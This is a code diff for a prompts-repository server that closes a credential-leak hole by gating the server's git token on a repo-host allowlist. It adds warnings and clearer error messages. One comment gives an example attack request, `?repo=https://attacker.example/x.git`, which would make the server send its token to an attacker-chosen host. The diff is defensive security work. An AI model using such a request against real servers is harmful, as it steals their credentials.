@@ -22,6 +22,9 @@ import {
   pullRepo,
   sanitizeRelativePath,
   scrubCredentials,
+  isRepoHostAllowed,
+  getAllowedRepoHosts,
+  getRepoHost,
 } from './git-utils';
 import { Prompt, PromptFile, loadPromptFile } from '../tools/prompts';
 
@@ -34,6 +37,19 @@ export interface UserPromptsConfig {
   subPath: string;
   gitToken?: string;
   cacheTtlSeconds: number;
+  /**
+   * PRD #710: true when `repoUrl` came from a PER-REQUEST override (`?repo=`),
+   * i.e. from the client, rather than from the operator's
+   * DOT_AI_USER_PROMPTS_REPO.
+   *
+   * It exists to decide one thing: whether the server's own git credential may
+   * be attached to this URL at all (see shouldWithholdServerCredential). The
+   * operator's env-configured repo is the operator's own choice of destination
+   * and is NOT gated — it is the same trust class as the allowlist itself, so
+   * gating it would only break the operator's private GitLab prompts repo while
+   * protecting nothing.
+   */
+  repoUrlIsClientSupplied?: boolean;
 }
 
 /**
@@ -688,7 +704,99 @@ export function getUserPromptsConfigFromOverride(
     // the env credential remains the fallback when no header is present.
     gitToken: override.gitToken ?? process.env.DOT_AI_GIT_TOKEN,
     cacheTtlSeconds,
+    // PRD #710: this repoUrl came from the request, so the server credential is
+    // allowlist-gated before it can be attached to it.
+    repoUrlIsClientSupplied: true,
   };
+}
+
+/**
+ * Whether the SERVER's git credential must be withheld from this repository
+ * (PRD #710, the prompts-override instance of the credential-exfiltration
+ * finding).
+ *
+ * The hole: `?repo=https://attacker.example/x.git` with no X-Dot-AI-Git-Token
+ * header reaches the env-auth path of cloneRepo, which embeds DOT_AI_GIT_TOKEN
+ * (or a freshly minted GitHub App installation token) into whatever URL it was
+ * given — a URL the caller chose. getUserPromptsConfigFromOverride validates the
+ * SCHEME of that URL and nothing about its host.
+ *
+ * The remedy DEGRADES rather than refuses: the clone still happens, just without
+ * the server's credential, so every public repository on every host keeps
+ * working exactly as before. What changes is only a PRIVATE repo on a
+ * non-allowlisted host — and DOT_AI_GIT_TOKEN is a GitHub credential, so it
+ * would not have authenticated to GitLab or Bitbucket anyway. Such a request
+ * must forward its own credential in the X-Dot-AI-Git-Token header, which is the
+ * mechanism PRD #621 exists to provide.
+ *
+ * Two inputs, both necessary:
+ * - `repoUrlIsClientSupplied` — the operator's own DOT_AI_USER_PROMPTS_REPO is
+ *   not gated (see the field's docblock).
+ * - `overrideToken` — a request that brought its own credential is not touched
+ *   for ANY host (PRD #621 is unaffected); only the SERVER's credential is
+ *   gated, and cloneRepo's token path never reads the env anyway.
+ *
+ * Reuses isRepoHostAllowed — the same parsed-hostname comparison and the same
+ * `gitops.allowedRepoHosts` value pushToGit is gated on. No second parser, no
+ * second config value.
+ */
+function shouldWithholdServerCredential(
+  config: UserPromptsConfig,
+  overrideToken?: string
+): boolean {
+  if (!config.repoUrlIsClientSupplied) return false;
+  if (overrideToken) return false;
+  return !isRepoHostAllowed(config.repoUrl);
+}
+
+/**
+ * Announce a withheld credential — the whole point of degrading rather than
+ * refusing is that the request SUCCEEDS, so the only way an operator debugging
+ * "why is my private repo 404ing" learns of the decision is this line. Carries
+ * the host, the allowlist as it currently reads, and the way out.
+ *
+ * One function for both the clone and the pull path so they cannot drift into
+ * saying different things about the same decision.
+ */
+function warnServerCredentialWithheld(
+  logger: Logger,
+  config: UserPromptsConfig,
+  operation: 'clone' | 'pull'
+): void {
+  logger.warn(`Withholding the server git credential from this ${operation}`, {
+    url: sanitizeUrlForLogging(config.repoUrl),
+    host: getRepoHost(config.repoUrl),
+    allowedHosts: getAllowedRepoHosts(),
+    reason:
+      'the repository URL came from the request and its host is not on the "gitops.allowedRepoHosts" allowlist',
+    consequence:
+      operation === 'clone'
+        ? 'cloning unauthenticated; a private repository will fail unless the request supplies its own credential in the X-Dot-AI-Git-Token header'
+        : 'pulling unauthenticated; a private repository keeps serving the cached copy instead of refreshing, unless the request supplies its own credential in the X-Dot-AI-Git-Token header',
+  });
+}
+
+/**
+ * The operator-facing explanation of a withheld credential, appended to a clone
+ * failure so "why is my private repo 404ing" is answerable from the error alone
+ * rather than only from the (scrubbed) warn line.
+ *
+ * Names the parsed host, the two ways to fix it, and nothing from the URL itself
+ * — so a credential embedded in `repoUrl` cannot ride out in a message that
+ * reaches the client (the override failure path returns it as
+ * UserPromptsOverrideError).
+ */
+function describeWithheldServerCredential(repoUrl: string): string {
+  const host = getRepoHost(repoUrl);
+  const subject = host
+    ? `repository host "${host}" is not on the "gitops.allowedRepoHosts" allowlist`
+    : 'the repository URL does not name a host this server can parse, so it is not on the "gitops.allowedRepoHosts" allowlist';
+  const allowed = getAllowedRepoHosts();
+  const allowedText =
+    allowed.length === 0
+      ? 'the allowlist is currently empty'
+      : `currently allowed: ${allowed.join(', ')}`;
+  return `The server's git credential was NOT used for this clone because ${subject} (${allowedText}), so the repository was cloned unauthenticated. If it is private, send the credential with the request in the X-Dot-AI-Git-Token header, or add the host to the "gitops.allowedRepoHosts" Helm value.`;
 }
 
 /**
@@ -837,6 +945,18 @@ async function cloneRepository(
     localPath,
   });
 
+  // PRD #710: gate the SERVER's credential on the repo-host allowlist for a
+  // client-supplied URL, and make the degradation visible — an operator
+  // debugging "my private repo 404s" must be able to see that the credential
+  // was deliberately withheld rather than silently unused.
+  const withholdServerCredential = shouldWithholdServerCredential(
+    config,
+    overrideToken
+  );
+  if (withholdServerCredential) {
+    warnServerCredentialWithheld(logger, config, 'clone');
+  }
+
   try {
     // Ensure parent directory exists
     const parentDir = path.dirname(localPath);
@@ -855,6 +975,7 @@ async function cloneRepository(
       // Per-request override credential (PRD #621 M3). undefined → cloneRepo
       // falls back to env auth, i.e. today's behavior unchanged.
       token: overrideToken,
+      withholdServerCredential,
     });
 
     logger.info('Successfully cloned user prompts repository', {
@@ -868,7 +989,13 @@ async function cloneRepository(
       );
     const errorMessage =
       error instanceof Error ? error.message : 'Unknown error';
-    const sanitizedError = scrub(errorMessage);
+    // PRD #710: an unauthenticated clone of a private repo fails as a generic
+    // "not found" (that is what a 404 for an unauthenticated caller looks like),
+    // which points the operator at the wrong problem. Say why no credential was
+    // sent, and how to send one.
+    const sanitizedError = withholdServerCredential
+      ? `${scrub(errorMessage)} ${describeWithheldServerCredential(config.repoUrl)}`
+      : scrub(errorMessage);
 
     logger.error(
       'Failed to clone user prompts repository',
@@ -911,8 +1038,19 @@ async function pullRepository(
     localPath,
   });
 
+  // PRD #710: pullRepo rewrites `origin` to the authenticated URL, and `origin`
+  // of this cached clone is the URL the request supplied — so the same gate
+  // applies here, or the credential would leak on the first refresh instead of
+  // the first clone. This path only ever runs for the SHARED cache, which a
+  // token-bearing request never touches (it clones in isolation), so there is no
+  // override token to consider.
+  const withholdServerCredential = shouldWithholdServerCredential(config);
+  if (withholdServerCredential) {
+    warnServerCredentialWithheld(logger, config, 'pull');
+  }
+
   try {
-    await pullRepo(localPath);
+    await pullRepo(localPath, { withholdServerCredential });
 
     logger.debug('Successfully pulled user prompts repository', {
       url: sanitizedUrl,
